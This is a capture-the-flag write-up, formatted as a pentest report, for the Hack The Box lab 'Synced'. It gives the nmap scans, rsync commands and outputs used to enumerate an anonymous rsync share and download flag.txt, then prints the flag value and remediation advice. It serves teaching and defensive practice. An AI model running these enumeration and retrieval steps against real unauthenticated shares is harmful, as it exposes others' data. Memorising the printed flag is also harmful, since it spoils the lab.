# HTB Starting Point Lab Walkthrough: Synced (Linux Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit an rsync service on the target machine to retrieve a flag, simulating unauthenticated file share access.
- **Target IP**: 10.129.88.100
- **Key Findings**: Identified an rsync service (protocol version 31) on port 873 with an anonymous share (`public`) allowing unauthenticated access. Retrieved a sensitive file (`flag.txt`) from the share.
- **Impact**: In a real-world scenario, unauthenticated rsync access could lead to unauthorized data exposure or modification, risking sensitive information leakage.
- **Recommendations**: Restrict rsync to authenticated users, limit share access, and firewall port 873 to trusted hosts.
- **Completion Date**: July 17, 2025
- **Tools Used**: Nmap, rsync (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Synced." The scope was limited to port scanning, rsync service enumeration, and file access on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using default Kali tools. Assumptions: Target is a Linux machine running rsync version 31. The `--help` flag provided initial guidance, but external research (e.g., Google) was needed for complete rsync command options.

## Findings

### Finding 1: Rsync Service Identification

- **Description**: Rsync, a file synchronization protocol, was found running on port 873 with protocol version 31. Only one TCP port was open.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a full port scan using Nmap:
        
        ```bash
        nmap -p- -T4 10.129.88.100
        ```
        
        **Flag Explanation**: `-p-` scans all 65,535 TCP ports; `-T4` sets a fast scan speed (less stealthy but efficient).  
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 15:01 EDT
        Nmap scan report for 10.129.88.100
        Host is up (0.034s latency).
        Not shown: 65534 closed tcp ports (reset)
        PORT    STATE SERVICE
        873/tcp open  rsync
        Nmap done: 1 IP address (1 host up) scanned in 18.38 seconds
        ```
        
    2. Confirm service version on port 873:
        
        ```bash
        nmap -sV -p 873 10.129.88.100
        ```
        
        **Flag Explanation**: `-sV` enables version detection; `-p 873` targets the specific port.  
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-17 15:04 EDT
        Nmap scan report for 10.129.88.100
        Host is up (0.033s latency).
        PORT    STATE SERVICE VERSION
        873/tcp open  rsync   (protocol version 31)
        Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds
        ```
        
- **Impact**: Confirms rsync is active, enabling targeted enumeration of shares.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Unauthenticated Rsync Share Access

- **Description**: The rsync service allows anonymous access to a share named `public` without requiring credentials, revealing its contents.
- **Severity**: Medium (unauthenticated share access).
- **Steps to Reproduce**:
    1. List available rsync shares:
        
        ```bash
        rsync --list-only rsync://10.129.88.100:873/
        ```
        
        **Flag Explanation**: `--list-only` displays available shares without transferring files.  
        Output:
        
        ```bash
        public          Anonymous Share
        ```
        
    2. List files within the `public` share:
        
        ```bash
        rsync --list-only -r rsync://10.129.88.100:873/public
        ```
        
        **Flag Explanation**: `--list-only` shows file listings; `-r` enables recursive listing of directories.  
        Output:
        
        ```bash
        drwxr-xr-x          4,096 2022/10/24 18:02:23 .
        -rw-r--r--             33 2022/10/24 17:32:03 flag.txt
        ```
        
- **Impact**: Unauthenticated access to rsync shares risks unauthorized file access or modification.
- **Evidence**: Rsync share and file listing above.
- **Remediation**: Configure rsync to require authentication; restrict share access to authorized users.

### Finding 3: File Retrieval from Rsync Share

- **Description**: Retrieved a sensitive file (`flag.txt`) from the `public` share using rsync, confirming full read access.
- **Severity**: Critical (successful data exfiltration).
- **Steps to Reproduce**:
    1. Download the flag file from the `public` share:
        
        ```bash
        rsync -Wv rsync://10.129.88.100:873/public/flag.txt ~/htb
        ```
        
        **Flag Explanation**: `-W` copies whole files without delta transfer; `-v` enables verbose output for progress.  
        Output:
        
        ```bash
        flag.txt
        sent 43 bytes  received 131 bytes  23.20 bytes/sec
        total size is 33  speedup is 0.19
        ```
        
    2. Verify the downloaded file locally:
        
        ```bash
        ls
        ```
        
        Output:
        
        ```bash
        academy-regular.ovpn  mongodb-org-shell_3.6.23_amd64.deb  starting_point
        admin.txt            mongod.md                           starting_point_messorym.ovpn
        flag.txt             mongosh-2.3.2-linux-x64             synced.md
        gobuster_results.txt mongosh-2.3.2-linux-x64.tgz
        ```
        
    3. View the flag contents:
        
        ```bash
        cat flag.txt
        ```
        
        Output:
        
        ```bash
        72eaf5344ebb84908ae543a719830519
        ```
        
- **Impact**: Access to sensitive files demonstrates a real-world data breach scenario, potentially exposing critical information.
- **Evidence**: Command outputs and flag value above.
- **Remediation**: Remove sensitive files from rsync shares; implement strict permissions and authentication.

## Recommendations

- Configure rsync to require authentication (e.g., using `--password-file` or SSH-based access).
- Restrict network access to port 873 using firewall rules, allowing only trusted hosts.
- Regularly scan for exposed rsync services using tools like Nmap or rsync-specific scripts (e.g., `rsync-list-modules.nse`).
- For labs like this, explore advanced rsync enumeration with tools like `rsync` over SSH or Metasploit’s `auxiliary/scanner/rsync/modules` module.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures.)
- **Key Takeaway**: The `--help` flag is a starting point for tool usage, but external resources (e.g., Google) are often necessary to uncover complete command options, especially for tools like rsync.